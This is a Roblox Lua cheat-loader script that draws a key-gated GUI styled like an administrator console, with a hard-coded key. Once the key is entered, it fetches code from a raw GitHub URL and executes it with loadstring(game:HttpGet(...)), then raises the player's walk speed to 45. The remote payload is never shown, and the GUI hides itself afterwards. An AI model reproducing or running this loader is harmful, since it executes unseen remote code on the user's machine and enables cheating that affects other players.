-- 🟣 Keyo GUI Full Script (styled text fixed + purple - + white text)
local VALID_KEY = "@tappin"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local pg = player:WaitForChild("PlayerGui")

if pg:FindFirstChild("KeyoGui") then
	pg.KeyoGui:Destroy()
end

-- 🧩 FUNCTION TO RUN WHEN KEY IS CORRECT
local function runCustomScript()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/mizu-dump/Lua2Loadstring/main/Main/Yeah.lua"))()
	
	local char = player.Character or player.CharacterAdded:Wait()
	char:WaitForChild("Humanoid").WalkSpeed = 45
end

-- 🌀 Fade helper
local function fadeOutGui(screenGui, duration)
	for _, obj in ipairs(screenGui:GetDescendants()) do
		if obj:IsA("TextLabel") or obj:IsA("TextBox") then
			TweenService:Create(obj, TweenInfo.new(duration), {TextTransparency = 1}):Play()
		elseif obj:IsA("Frame") then
			TweenService:Create(obj, TweenInfo.new(duration), {BackgroundTransparency = 1}):Play()
		end
	end
	task.wait(duration)
	screenGui:Destroy()
end

-- MAIN GUI
local gui = Instance.new("ScreenGui")
gui.Name = "KeyoGui"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = pg

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 550, 0, 340)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Logo
local logo = Instance.new("ImageLabel")
logo.Size = UDim2.new(0, 24, 0, 24)
logo.Position = UDim2.new(0, 6, 0, 6)
logo.BackgroundTransparency = 0
logo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
logo.Image = "rbxassetid://12806397802"
logo.ScaleType = Enum.ScaleType.Fit
logo.Parent = frame

-- Header
local header = Instance.new("TextLabel")
header.Size = UDim2.new(1, -95, 0, 25)
header.Position = UDim2.new(0, 35, 0, 0)
header.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
header.Font = Enum.Font.Code
header.TextSize = 16
header.Text = "Administrator: Steam"
header.TextColor3 = Color3.fromRGB(230, 230, 230)
header.TextXAlignment = Enum.TextXAlignment.Left
header.Parent = frame

-- Minimize & Close
local minimize = Instance.new("TextButton")
minimize.Size = UDim2.new(0, 25, 0, 25)
minimize.Position = UDim2.new(1, -60, 0, 0)
minimize.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
minimize.BorderColor3 = Color3.fromRGB(60, 60, 60)
minimize.Font = Enum.Font.Code
minimize.Text = "_"
minimize.TextColor3 = Color3.fromRGB(150, 90, 255)
minimize.TextSize = 20
minimize.Parent = frame

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 25, 0, 25)
close.Position = UDim2.new(1, -30, 0, 0)
close.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
close.BorderColor3 = Color3.fromRGB(60, 60, 60)
close.Font = Enum.Font.Code
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 80, 80)
close.TextSize = 18
close.Parent = frame

-- ASCII
local ascii = Instance.new("TextLabel")
ascii.Size = UDim2.new(1, -30, 0, 180)
ascii.Position = UDim2.new(0, 15, 0, 40)
ascii.BackgroundTransparency = 1
ascii.Font = Enum.Font.Code
ascii.RichText = true
ascii.TextSize = 14
ascii.TextColor3 = Color3.fromRGB(255, 255, 255)
ascii.TextXAlignment = Enum.TextXAlignment.Left
ascii.TextYAlignment = Enum.TextYAlignment.Top
ascii.Text = [[
<font color="#FFFFFF">oooo    oooo oooooooooooo oooooo   oooo   .oooooo.   </font>
<font color="#FFFFFF">`888   .8P'  `888'     `8  `888.   .8'   d8P'  `Y8b  </font>
<font color="#FFFFFF"> 888  d8'     888           `888. .8'   888      888 </font>
<font color="#FFFFFF"> 88888[       888oooo8       `888.8'    888      888 </font>
<font color="#FFFFFF"> 888`88b.     888    "        `888'     888      888 </font>
<font color="#FFFFFF"> 888  `88b.   888       o      888      `88b    d88' </font>
<font color="#FFFFFF">o888o  o888o o888ooooood8     o888o      `Y8bood8P'  </font>
]]
ascii.Parent = frame

-- Key label & input
local keylbl = Instance.new("TextLabel")
keylbl.Size = UDim2.new(0, 80, 0, 25)
keylbl.Position = UDim2.new(0, 40, 0, 210)
keylbl.BackgroundTransparency = 1
keylbl.Font = Enum.Font.Code
keylbl.TextSize = 14
keylbl.RichText = true
keylbl.Text = "<font color='#FFFFFF'>[</font><font color='#965AFF'>-</font><font color='#FFFFFF'>]</font> <font color='#FFFFFF'>Key:</font>"
keylbl.TextXAlignment = Enum.TextXAlignment.Right
keylbl.Parent = frame

local keybox = Instance.new("TextBox")
keybox.Size = UDim2.new(0, 180, 0, 25)
keybox.Position = UDim2.new(0, 125, 0, 210)
keybox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
keybox.TextColor3 = Color3.fromRGB(230, 230, 230)
keybox.Font = Enum.Font.Code
keybox.TextSize = 14
keybox.ClearTextOnFocus = false
keybox.Text = ""
keybox.TextXAlignment = Enum.TextXAlignment.Center
keybox.Parent = frame

-- Minimize logic
local reopenGui = Instance.new("ScreenGui")
reopenGui.Name = "KeyoReopenGui"
reopenGui.IgnoreGuiInset = true
reopenGui.ResetOnSpawn = false
reopenGui.Parent = pg
reopenGui.Enabled = false

local reopenButton = Instance.new("TextButton")
reopenButton.Name = "ReopenButton"
reopenButton.Size = UDim2.new(0, 130, 0, 35)
reopenButton.Position = UDim2.new(0.02, 0, 0.85, 0)
reopenButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
reopenButton.BorderColor3 = Color3.fromRGB(60, 60, 60)
reopenButton.Font = Enum.Font.Code
reopenButton.TextSize = 16
reopenButton.TextColor3 = Color3.fromRGB(150, 90, 255)
reopenButton.Text = "[+] Open Keyo"
reopenButton.Parent = reopenGui

local function setMinimized(state)
	gui.Enabled = not state
	reopenGui.Enabled = state
end

minimize.MouseButton1Click:Connect(function()
	setMinimized(true)
end)

reopenButton.MouseButton1Click:Connect(function()
	setMinimized(false)
end)

close.MouseButton1Click:Connect(function()
	gui:Destroy()
	reopenGui:Destroy()
end)

-- ✅ Key logic
keybox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		if keybox.Text == VALID_KEY then
			keylbl.Visible = false
			keybox.Visible = false

			local authGui = Instance.new("TextLabel")
			authGui.Size = UDim2.new(0, 300, 0, 35)
			authGui.Position = keylbl.Position
			authGui.BackgroundTransparency = 1
			authGui.Font = Enum.Font.Code
			authGui.TextSize = 16
			authGui.RichText = true
			authGui.Text = "<font color='#FFFFFF'>[</font><font color='#965AFF'>-</font><font color='#FFFFFF'>]</font> <font color='#FFFFFF'>Authenticating...</font>"
			authGui.Parent = frame

			task.wait(2)
			authGui.Text = "<font color='#FFFFFF'>[</font><font color='#965AFF'>-</font><font color='#FFFFFF'>]</font> <font color='#FFFFFF'>Hiding console in <font color='#965AFF'>5.00</font> seconds...</font>"
			task.wait(5)
			
			runCustomScript()
			fadeOutGui(gui, 1.5)
			reopenGui:Destroy()
		else
			keylbl.Visible = false
			keybox.Visible = false
			local invalidMsg = Instance.new("TextLabel")
			invalidMsg.Size = UDim2.new(0, 250, 0, 35)
			invalidMsg.Position = keylbl.Position
			invalidMsg.BackgroundTransparency = 1
			invalidMsg.Font = Enum.Font.Code
			invalidMsg.TextSize = 16
			invalidMsg.RichText = true
			invalidMsg.Text = "<font color='#FFFFFF'>[</font><font color='#965AFF'>-</font><font color='#FFFFFF'>]</font> <font color='#FFFFFF'>Invalid Key!</font>"
			invalidMsg.Parent = frame
			task.wait(2)
			invalidMsg:Destroy()
			keylbl.Visible = true
			keybox.Visible = true
		end
	end
end)